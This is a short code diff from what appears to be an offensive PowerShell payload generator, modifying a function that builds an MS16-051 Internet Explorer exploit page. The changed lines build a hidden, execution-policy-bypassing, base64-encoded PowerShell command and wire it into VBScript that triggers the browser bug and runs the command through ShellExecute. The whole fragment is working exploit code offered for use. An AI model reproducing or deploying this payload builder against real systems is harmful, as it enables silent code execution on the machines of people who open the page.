@@ -497,9 +497,11 @@ UpdateMacro'
 # create MS16-051 payload
 function Create-MS16-051-Payload
 {
-  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-  $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
-  $payload = $payloadraw -replace "`n", ""
+    $poshexec = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
+    $bytes = [Text.Encoding]::Unicode.GetBytes($command)
+    $payloadraw = ' "-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+    $payload = $payloadraw -replace "`n", ""
+    $htmlpayload = $poshexec+'"'+','+$payload
 
   $html = @"
 <html>
@@ -607,7 +609,7 @@ function Create-MS16-051-Payload
 
             ' Execute cmd
             Set Object = CreateObject("Shell.Application")
-            Object.ShellExecute "$payload"
+            Object.ShellExecute "$htmlpayload"
         End Function
 
         Function triggerBug
